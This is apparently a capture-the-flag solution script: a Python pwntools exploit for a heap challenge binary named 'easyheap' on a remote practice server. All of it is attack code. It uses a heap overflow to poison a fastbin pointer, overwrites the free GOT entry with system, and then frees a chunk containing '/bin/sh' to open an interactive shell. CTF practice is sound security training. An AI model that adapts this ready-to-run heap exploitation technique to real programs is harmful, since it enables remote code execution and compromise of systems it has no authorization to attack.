#!/usr/bin/python

from pwn import *

# r = process("./easyheap")
r = remote('node3.buuoj.cn', 25656)
elf = ELF('./easyheap')


def create(size, content):
    r.recvuntil('Your choice :')
    r.sendline('1')
    r.sendlineafter('Size of Heap : ', str(size))
    r.sendlineafter('Content of heap:', content)


def edit(index, content):
    r.recvuntil('Your choice :')
    r.sendline('2')
    r.sendlineafter('Index :', str(index))
    r.sendlineafter('Size of Heap : ', str(len(content)))
    r.sendlineafter('Content of heap : ', content)



def delete(index):
    r.recvuntil('Your choice :')
    r.sendline('3')
    r.sendlineafter('Index :', str(index))


create(0x68, 'aaaa')  # chunk0
create(0x68, 'bbbb')  # chunk1
create(0x68, 'cccc')  # chunk2
delete(2)

payload = '/bin/sh\x00' + 'a'*0x60 + p64(0x71) + p64(0x6020b0-3)
edit(1, payload)

create(0x68, 'aaaa')  # chunk2
create(0x68, 'c') # chunk3

free_got = elf.got['free']

payload = '\xaa'*3 + p64(0)*4 + p64(free_got)
edit(3, payload)
payload = p64(elf.plt['system'])
edit(0, payload)
delete(1)

#gdb.attach(r)
r.interactive()
